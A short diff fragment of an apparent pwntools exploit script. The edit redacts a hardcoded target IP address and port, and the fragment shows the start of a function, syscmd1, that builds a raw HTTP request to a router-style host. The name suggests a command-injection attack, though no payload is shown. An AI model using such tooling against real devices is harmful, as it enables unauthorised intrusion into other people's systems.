@@ -37,7 +37,7 @@ from pwn import *
 
 
 def syscmd1(a):
-	p=remote('195.211.139.95',8080)
+	p=remote('195.211.?',8080)
 	payload=''
 	payload+='GET / HTTP/1.1\r\n'
 	payload+='Host: 192.168.0.1\r\n'
